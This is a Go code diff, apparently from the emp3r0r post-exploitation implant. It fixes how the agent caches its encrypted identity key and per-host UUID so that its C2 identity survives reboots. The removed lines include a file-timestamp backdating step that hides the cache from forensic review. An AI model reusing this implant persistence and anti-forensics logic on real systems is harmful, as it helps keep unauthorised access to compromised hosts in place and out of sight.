@@ -133,7 +133,11 @@ func GetAgentKey() error {
 		// Try the encrypted local cache first: a restart reuses the pinned
 		// identity instead of invalidating it (operator would have to forget).
 		if !keyPersistDisabled() {
-			if cached, loadErr := loadCachedAgentKey(); loadErr == nil && cached != nil {
+			cached, loadErr := loadCachedAgentKey()
+			if loadErr != nil {
+				logging.Warningf("agent key cache load failed: %v", loadErr)
+			}
+			if cached != nil {
 				setAgentKey(cached)
 				logging.Infof("Agent key restored from local cache (identity stable across restarts)")
 				return
@@ -147,9 +151,15 @@ func GetAgentKey() error {
 			setAgentKey(generatedKey)
 			// persist for restarts; failure only means the old behavior
 			// (fresh key per process, operator forgets on restart)
-			if !keyPersistDisabled() {
+			//
+			// Multi-host: do NOT write the cache here. ApplyHostIdentity owns
+			// the cache write (mint persists key+hostUUID together). Writing
+			// the build UUID here would make ApplyHostIdentity "restore" the
+			// build UUID on FIRST run and skip the per-host mint entirely —
+			// every host would then check in with the same UUID.
+			if !keyPersistDisabled() && (common.RuntimeConfig == nil || !common.RuntimeConfig.MultiHost) {
 				if saveErr := saveCachedAgentKey(generatedKey); saveErr != nil {
-					logging.Debugf("agent key cache: %v", saveErr)
+					logging.Warningf("agent key cache save: %v", saveErr)
 				}
 			}
 		}
@@ -176,7 +186,7 @@ func RenewAgentKey() error {
 	// expected after a deliberate rekey.
 	if !keyPersistDisabled() {
 		if saveErr := saveCachedAgentKey(key); saveErr != nil {
-			logging.Debugf("agent key cache: %v", saveErr)
+			logging.Warningf("agent key cache save: %v", saveErr)
 		}
 	}
 	return nil
@@ -197,12 +207,25 @@ func keyCachePath() (string, error) {
 }
 
 // keyCacheKEK derives the file-encryption key from material that is already
-// embedded in the agent: the config password and the agent UUID.
+// embedded in the agent: the config password and the PARENT build UUID.
+//
+// The UUID side must be the same at write and read time. Using
+// RuntimeConfig.AgentUUID directly was a bug: the cache is written after
+// the per-host UUID is minted (AgentUUID = hostUUID) but read BEFORE any
+// restoration is possible (AgentUUID = build UUID) — the KEK never
+// matched, every reboot minted a fresh identity and the cached one was
+// silently discarded (observed 2026-09-22: three reboots, three UUIDs).
+// AgentUUIDParent is the stable multi-host anchor; single-host builds have
+// it empty, so AgentUUID (== the build UUID) is used instead.
 func keyCacheKEK() ([]byte, error) {
 	if common.RuntimeConfig == nil {
 		return nil, fmt.Errorf("runtime config not ready")
 	}
-	material := common.RuntimeConfig.Password + "|" + common.RuntimeConfig.AgentUUID
+	uuid := common.RuntimeConfig.AgentUUIDParent
+	if uuid == "" {
+		uuid = common.RuntimeConfig.AgentUUID
+	}
+	material := common.RuntimeConfig.Password + "|" + uuid
 	return hkdf.Key(sha256.New, []byte(material), []byte("emp3r0r-agent-key-cache-v1"), "agent identity persistence", 32)
 }
 
@@ -222,94 +245,32 @@ func keyPersistDisabled() bool {
 	return false
 }
 
-// saveCachedAgentKey encrypts the private key (PKCS#8) with AES-GCM and
-// writes it to the cache file with a backdated mtime.
+// saveCachedAgentKey persists the private key together with the current
+// host UUID as the v2 JSON envelope.
+//
+// History note: this used to write a raw PKCS#8 blob (v1) while
+// ApplyHostIdentity wrote a JSON envelope (v2) to the SAME file — the two
+// writers kept invalidating each other, so the cached host UUID never
+// survived a reboot and every boot minted a new identity (observed
+// 2026-09-22: three reboots, three UUIDs). Both now share the v2 envelope.
 func saveCachedAgentKey(key *ecdsa.PrivateKey) error {
-	path, err := keyCachePath()
-	if err != nil {
-		return err
-	}
-	kek, err := keyCacheKEK()
-	if err != nil {
-		return err
-	}
-	der, err := x509.MarshalPKCS8PrivateKey(key)
-	if err != nil {
-		return err
-	}
-	block, err := aes.NewCipher(kek)
-	if err != nil {
-		return err
-	}
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return err
-	}
-	nonce := make([]byte, gcm.NonceSize())
-	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
-		return err
-	}
-	blob := gcm.Seal(nonce, nonce, der, nil)
-	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
-		return err
-	}
-	if err := os.WriteFile(path, blob, 0o600); err != nil {
-		return err
-	}
-	util.BackdateFile(path, 20, 180)
-	return nil
+	// keep whatever host UUID the existing envelope carries — this writer
+	// only refreshes the key part of the cache
+	_, oldUUID, _ := loadCachedIdentity()
+	return saveCachedIdentity(key, oldUUID)
 }
 
 // loadCachedAgentKey reads and decrypts the identity cache. Any failure
 // (missing, corrupt, wrong KEK) falls back to a fresh key.
 func loadCachedAgentKey() (*ecdsa.PrivateKey, error) {
-	path, err := keyCachePath()
-	if err != nil {
-		return nil, err
-	}
-	blob, err := os.ReadFile(path)
-	if err != nil {
-		return nil, err
-	}
-	kek, err := keyCacheKEK()
-	if err != nil {
-		return nil, err
-	}
-	block, err := aes.NewCipher(kek)
-	if err != nil {
-		return nil, err
-	}
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return nil, err
-	}
-	if len(blob) < gcm.NonceSize() {
-		return nil, fmt.Errorf("key cache too short")
-	}
-	der, err := gcm.Open(nil, blob[:gcm.NonceSize()], blob[gcm.NonceSize():], nil)
-	if err != nil {
-		return nil, err
-	}
-	parsed, err := x509.ParsePKCS8PrivateKey(der)
-	if err != nil {
-		return nil, err
-	}
-	key, ok := parsed.(*ecdsa.PrivateKey)
-	if !ok {
-		return nil, fmt.Errorf("not an ECDSA key")
-	}
-	return key, nil
-}
-
-// hostIdentityCache is the v2 key-cache payload: the session key plus the
-// per-host UUID minted in multi-host mode. JSON-framed inside the same
-// AES-GCM envelope; legacy blobs (raw PKCS8 DER) still load as key-only.
-type hostIdentityCache struct {
-	HostUUID string `json:"host_uuid"`
-	DER      []byte `json:"der"`
+	key, _, err := loadCachedIdentity()
+	return key, err
 }
 
 // loadCachedIdentity restores the key and (if present) the per-host UUID.
+// Accepts both the v2 JSON envelope and the legacy raw PKCS#8 blob (key
+// only, no UUID) so that caches written by older builds still restore the
+// session key — only the UUID restore requires v2.
 func loadCachedIdentity() (*ecdsa.PrivateKey, string, error) {
 	path, err := keyCachePath()
 	if err != nil {
@@ -378,9 +339,11 @@ func ApplyHostIdentity() {
 	}
 	// restore host UUID if the cache already carries one
 	if !keyPersistDisabled() {
-		if cached, hostUUID, loadErr := loadCachedIdentity(); loadErr == nil && cached != nil && hostUUID != "" {
+		cached, hostUUID, loadErr := loadCachedIdentity()
+		logging.Warningf("identity cache load: err=%v uuid=%s parent=%s", loadErr, hostUUID, common.RuntimeConfig.AgentUUIDParent)
+		if loadErr == nil && cached != nil && hostUUID != "" {
 			common.RuntimeConfig.AgentUUID = hostUUID
-			logging.Infof("Host identity restored: %s (parent build %s)", hostUUID, common.RuntimeConfig.AgentUUIDParent)
+			logging.Warningf("Host identity restored: %s (parent build %s)", hostUUID, common.RuntimeConfig.AgentUUIDParent)
 			return
 		}
 	}
@@ -389,10 +352,17 @@ func ApplyHostIdentity() {
 	common.RuntimeConfig.AgentUUID = hostUUID
 	if !keyPersistDisabled() {
 		if saveErr := saveCachedIdentity(key, hostUUID); saveErr != nil {
-			logging.Debugf("host identity cache: %v", saveErr)
+			logging.Warningf("host identity cache save: %v", saveErr)
 		}
 	}
 	logging.Infof("Multi-host mode: derived per-host UUID %s (parent build %s)", hostUUID, common.RuntimeConfig.AgentUUIDParent)
+}
+
+// hostIdentityCache is the v2 JSON envelope stored in the key cache:
+// the private key plus the per-host UUID minted by ApplyHostIdentity.
+type hostIdentityCache struct {
+	HostUUID string `json:"host_uuid"`
+	DER      []byte `json:"der"`
 }
 
 // saveCachedIdentity persists key + host UUID as the v2 JSON envelope.
